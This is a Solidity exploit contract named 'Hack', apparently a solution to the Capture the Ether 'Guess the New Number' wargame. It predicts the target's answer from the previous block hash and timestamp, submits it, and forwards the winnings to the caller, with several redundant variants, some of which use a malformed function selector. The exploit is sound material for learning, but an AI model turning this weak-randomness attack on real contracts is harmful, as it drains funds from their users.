/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function isComplete() external returns (bool);
    function guess(uint8 n) external payable;
    function guess2(uint8 n) external payable;
    function geteth() public;
}

contract Hack {
    function Hack() public payable{
    }

    function checkComp(address addr) public view returns (bool){
        return GuessTheNewNumberChallenge(addr).isComplete();
    }

    function GetNum() public view returns (uint8){
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

   function GetEth(address addr) public payable {
        GuessTheNewNumberChallenge(addr).geteth();
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther0(address addr) public payable {
        require(msg.value > 0.001 ether);
        GuessTheNewNumberChallenge(addr).guess.value(0.001 ether)(GetNum());
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).guess.value(1 ether)(GetNum());
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther2(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).guess(GetNum());
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther3(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).isComplete();
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther4(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = addr.call(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther5(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = (address(addr)).call.value(1 ether)(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther6(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = addr.call(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
        require(ok);
    }

    function GuessOther7(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = (address(addr)).call.value(1 ether)(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
        require(ok);
    }
}